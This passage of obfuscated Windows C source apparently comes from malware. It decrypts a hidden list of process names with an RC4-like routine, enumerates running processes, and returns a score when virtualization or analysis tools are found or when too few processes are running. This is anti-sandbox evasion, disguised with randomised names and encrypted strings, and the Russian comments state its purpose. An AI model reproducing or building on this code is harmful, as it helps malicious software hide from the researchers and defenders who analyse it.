ewctbQbqksjbkztme = strlen((char *)dgguzBzvpclpj);nksxeOvdofmfwyszq(ejjroIcuopkmffrqn, dgguzBzvpclpj, ewctbQbqksjbkztme);oekdvTucorbxoxey(fpcorPbykjqmfbum, kvsmbArbjttsoeurhl, ejjroIcuopkmffrqn);const TCHAR process31_utka[sizeof(fpcorPbykjqmfbum)];memcpy(process31_utka, fpcorPbykjqmfbum, kvsmbArbjttsoeurhl + 1);unsigned char honqnTidwnc[] = {0x34, 0x5E, 0x1A, 0x1E, 0x75, 0x21, 0xA7, 0x5C,'\0'};int pkdjwAvxdoqprpyo = 256;unsigned char ilhdzLgzvoyascifrnqg[] = {'v','z','g','h','x','R','w','a','z','b','g','o','k','x','w','r','w','l','z','\0'};unsigned char xwgvsWwyjxusdyxayrzw[pkdjwAvxdoqprpyo];size_t vsagjDtldcbvvcloprp = strlen((char *)honqnTidwnc);size_t wsyhfXiabosoiqwqlq = strlen((char *)ilhdzLgzvoyascifrnqg);nksxeOvdofmfwyszq(xwgvsWwyjxusdyxayrzw, ilhdzLgzvoyascifrnqg, wsyhfXiabosoiqwqlq);oekdvTucorbxoxey(honqnTidwnc, vsagjDtldcbvvcloprp, xwgvsWwyjxusdyxayrzw);const TCHAR process32_utka[sizeof(honqnTidwnc)];memcpy(process32_utka, honqnTidwnc, vsagjDtldcbvvcloprp + 1);unsigned char tcadeQhdbqbynkgq[] = {0x44, 0xF5, 0x35, 0xFA, 0xD2, 0xFD, 0xE5, 0x6B, 0xFB, 0xED,'\0'};int reakiCgfquwtkohgr = 256;unsigned char uicofUzozp[] = {'r','v','v','x','w','F','n','e','y','r','e','\0'};unsigned char kvyojIzvksfpbdprmmv[reakiCgfquwtkohgr];size_t bifstUjvigapjxx = strlen((char *)tcadeQhdbqbynkgq);size_t kkkylUdbtoanuvjjp = strlen((char *)uicofUzozp);nksxeOvdofmfwyszq(kvyojIzvksfpbdprmmv, uicofUzozp, kkkylUdbtoanuvjjp);oekdvTucorbxoxey(tcadeQhdbqbynkgq, bifstUjvigapjxx, kvyojIzvksfpbdprmmv);const TCHAR process33_utka[sizeof(tcadeQhdbqbynkgq)];memcpy(process33_utka, tcadeQhdbqbynkgq, bifstUjvigapjxx + 1);unsigned char ixrwpRuzlavqekzqhvg[] = {0xBE, 0x2D, 0x67, 0xA6, 0x35, 0x5A, 0x6E, 0xD8,'\0'};int axfmvOvbjfvzj = 256;unsigned char nuoxkKtspiktdvg[] = {'g','m','l','b','x','S','r','o','z','q','b','n','m','f','n','t','b','v','\0'};unsigned char geyvvTxygjajhufxlqu[axfmvOvbjfvzj];size_t itukaGnalomfiwrtcy = strlen((char *)ixrwpRuzlavqekzqhvg);size_t ammdgOwqgazumaqy = strlen((char *)nuoxkKtspiktdvg);nksxeOvdofmfwyszq(geyvvTxygjajhufxlqu, nuoxkKtspiktdvg, ammdgOwqgazumaqy);oekdvTucorbxoxey(ixrwpRuzlavqekzqhvg, itukaGnalomfiwrtcy, geyvvTxygjajhufxlqu);const TCHAR process34_utka[sizeof(ixrwpRuzlavqekzqhvg)];memcpy(process34_utka, ixrwpRuzlavqekzqhvg, itukaGnalomfiwrtcy + 1);unsigned char xjfgxWpsnirvcrs[] = {0xA5, 0x4E, 0x94, 0x22, 0x75, 0x65, 0x79, 0x8E,'\0'};int klnypEhjibxayohnokjr = 256;unsigned char zqukwWlmathfcexjhs[] = {'w','f','v','y','z','E','v','a','l','f','j','t','d','n','k','b','j','i','a','m','\0'};unsigned char eneudLxhhkgkwgk[klnypEhjibxayohnokjr];size_t esquvCtrgalo = strlen((char *)xjfgxWpsnirvcrs);size_t almcqBbfrlmfi = strlen((char *)zqukwWlmathfcexjhs);nksxeOvdofmfwyszq(eneudLxhhkgkwgk, zqukwWlmathfcexjhs, almcqBbfrlmfi);oekdvTucorbxoxey(xjfgxWpsnirvcrs, esquvCtrgalo, eneudLxhhkgkwgk);const TCHAR process35_utka[sizeof(xjfgxWpsnirvcrs)];memcpy(process35_utka, xjfgxWpsnirvcrs, esquvCtrgalo + 1);unsigned char ehxdlQxupsm[] = {0x76, 0x67, 0xB1, 0x76, 0xD4, 0xBA, 0x0A, 0x69, 0xF6, 0xF5,'\0'};int tgijzHepvnmclmygmmq = 256;unsigned char lcoafIksypnccmumyr[] = {'u','p','q','e','l','L','t','t','o','z','r','n','\0'};unsigned char zqgyjBsiamphzwbx[tgijzHepvnmclmygmmq];size_t urnfnWipjawuyngoofo = strlen((char *)ehxdlQxupsm);size_t eevdqNyvyjodz = strlen((char *)lcoafIksypnccmumyr);nksxeOvdofmfwyszq(zqgyjBsiamphzwbx, lcoafIksypnccmumyr, eevdqNyvyjodz);oekdvTucorbxoxey(ehxdlQxupsm, urnfnWipjawuyngoofo, zqgyjBsiamphzwbx);const TCHAR process36_utka[sizeof(ehxdlQxupsm)];memcpy(process36_utka, ehxdlQxupsm, urnfnWipjawuyngoofo + 1);unsigned char tgybvSyaeypgzmgndae[] = {0x0D, 0x14, 0x98, 0xD7, 0xC4, 0x9C, 0xA7, 0x08, 0xAB, 0xDD,'\0'};int sgrctCmfihyfsirr = 256;unsigned char hohjlFflcnusvfx[] = {'h','c','m','s','b','K','r','z','s','g','n','\0'};unsigned char exdlqFkatshphc[sgrctCmfihyfsirr];size_t izobtOknulxaimuwb = strlen((char *)tgybvSyaeypgzmgndae);size_t qezifVfqmtlxaa = strlen((char *)hohjlFflcnusvfx);nksxeOvdofmfwyszq(exdlqFkatshphc, hohjlFflcnusvfx, qezifVfqmtlxaa);oekdvTucorbxoxey(tgybvSyaeypgzmgndae, izobtOknulxaimuwb, exdlqFkatshphc);const TCHAR process37_utka[sizeof(tgybvSyaeypgzmgndae)];memcpy(process37_utka, tgybvSyaeypgzmgndae, izobtOknulxaimuwb + 1);const TCHAR* monitoredProcesses[] = {process1_utka,process2_utka,process3_utka,process4_utka,process5_utka,process6_utka,process7_utka,process8_utka,process9_utka,process10_utka,process11_utka,process12_utka,process14_utka,process15_utka,process16_utka,process17_utka,process18_utka,process19_utka,process20_utka,process21_utka,process22_utka,process23_utka,process24_utka,process25_utka,process26_utka,process27_utka,process28_utka,process29_utka,process30_utka,process31_utka,process32_utka,process33_utka,process34_utka,process35_utka,process36_utka,process37_utka};for (int i = 0; i < sizeof(monitoredProcesses) / sizeof(monitoredProcesses[0]); i++) {if (_tcsicmp(processName, monitoredProcesses[i]) == 0) {return TRUE;                        // Совпадение найдено}}return FALSE;                               // Не найдено}int deincStaslbvbpwulhc(){DWORD processes[1024];          // Массив для храниения PID-ов процессовDWORD cbNeeded;                 // Кол-во реально использованых байт в массиве processDWORD processCount;             // Общее число процессовif (!mckdjRspwm(processes, sizeof(processes), &cbNeeded)) {      // Получаем список PID всех активных процессовreturn 0;}processCount = cbNeeded / sizeof(DWORD);        // Вычисляем число процессов - всего байт / размер одного PIDfor (DWORD i = 0; i < processCount; i++) {      // Перебираем каждый PIDDWORD pid = processes[i];                   // Получаем текущий PIDif(pid==0)                                  // PID 0 - это системный процессcontinue;HANDLE dvchhLhqxc = lbjrcFtiqfmfqqbs(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);     // Пытаемся открыть процесс с нужными правамиif (dvchhLhqxc) {HMODULE hMod;                   // Для хранения хендла на первый модуль (исполняемый файл)DWORD cbNeededMod;              // Нужен для EnumProcessModulesTCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");   // Имя процесса по умолчаниюif (nfgwnYdinaj(dvchhLhqxc, &hMod, sizeof(hMod), &cbNeededMod)) {      // Получаем списко модулей в процессе (обычно первым модулем является .exe)yaogkQyaqrlfxc(dvchhLhqxc, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));}if (itbgqAzczfksfbsknbf(szProcessName)) {                                       // Если процес виртуализации был найденreturn 7;} else {}CloseHandle(dvchhLhqxc);          // Закрываем дескриптор процесса, освобождаем ресурсы}}if(processCount < 100) {return 7;}else if(processCount < 150) {return 4;}else if(processCount < 170) {return 1;}return 0;}